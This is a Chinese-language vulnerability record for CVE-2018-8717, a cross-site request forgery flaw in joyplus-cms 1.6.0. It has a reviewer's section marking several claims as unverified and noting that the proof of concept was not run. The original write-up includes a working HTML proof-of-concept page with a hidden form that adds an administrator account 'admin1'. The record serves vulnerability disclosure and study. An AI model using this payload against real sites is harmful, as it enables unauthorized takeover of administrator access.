---
cve: "CVE-2018-8717"
source: "白阁文库 BaizeSec/bylibrary"
product: "joyplus-cms1.6.0"
record_type: "unknown"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: "CVE-2018-8717"
referenced_identifiers: ""
identifier_role: "primary"
identifier_status: "unknown"
title: "joyplus-cms 1.6.0存在CSRF漏洞可增加管理员账户"
prerequisites: "来源所述条件，未列明部分仍待核：victimadminsession;manualformsubmit; targetmanagerendpoint"
side_effects: "未执行；原文未提供完整的状态变化与恢复证据，实际操作影响按本文入口、进程权限和实验条件核对"
source_status: "unknown"
id: "vw-9900b8bdef92c4ad15d4ee48"
entity_id: "ve-9900b8bdef92c4ad15d4ee48"
schema_version: "1"
---

## 核对与使用边界

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：victimadminsession;manualformsubmit; targetmanagerendpoint

- **结论使用边界（1）**：概述说普通用户提权，PoCflagadd/m_id空实际新增管理员，应改动作类型。此项限制直接适用于下文对应结论；现有正文不足以作更宽泛推论，所列方法和原始证据均保留。

- **适用与权限边界（2）**：只有submit按钮没有自动提交，访问页面不是充分触发条件。按此限制解释本文结论，版本相同不足以证明所需角色、入口、配置、依赖或可控参数均已满足；原操作和失败记录一并保留。

- **凭据与会话边界（3）**：tab={pre}manager是否服务端宏需源码核，不能默认已替换；Cookie/SameSite条件缺。抓包中的会话不能视为未认证访问证明。需重新取得授权测试会话，不能复用文中值。

- **事实待核（4）**：有原GitHubissue419和MITRE可溯，缺修复/响应。该项尚不能从转载本身确定外部事实；下文相应编号、版本或修复说法只作为来源记录，不能据此判定部署受影响或已修复。明确更正另列于本节。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# joyplus-cms 1.6.0存在CSRF漏洞可增加管理员账户

### 漏洞简介  

|漏洞名称|上报日期|漏洞发现者|产品首页|软件链接|版本|CVE编号|
--------|--------|---------|--------|-------|----|------|
|joyplus-cms 1.6.0存在CSRF漏洞可增加管理员账户|2018-03-14|yx（yx@5ecurity.cn）|[https://github.com/joyplus/joyplus-cms/](https://github.com/joyplus/joyplus-cms/) | [https://github.com/joyplus/joyplus-cms/](https://github.com/joyplus/joyplus-cms/) |1.6.0 | [CVE-2018-8717](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-8717)|  

#### 漏洞概述  

> joyplus-cms 1.6.0存在CSRF漏洞，当管理员登陆后访问下面CSRF测试页面可将普通用户提成为管理员权限。joyplus-cms是一个在github上开源的CMS系统，漏洞发现者已经将漏洞信息通过[issues](https://github.com/joyplus/joyplus-cms/issues/419)告知作者。  

### POC实现代码如下：  

> CSRF测试页面代码如下：
``` html
<html>
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="http://192.168.126.129/joyplus-cms-master/joyplus-cms/manager/admin_ajax.php?action=save&tab={pre}manager" method="POST">
      <input type="hidden" name="m&#95;id" value="" />
      <input type="hidden" name="flag" value="add" />
      <input type="hidden" name="m&#95;name" value="admin1" />
      <input type="hidden" name="m&#95;password" value="admin1" />
      <input type="hidden" name="m&#95;status" value="1" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>
```


---

> 来源：白阁文库 BaizeSec/bylibrary
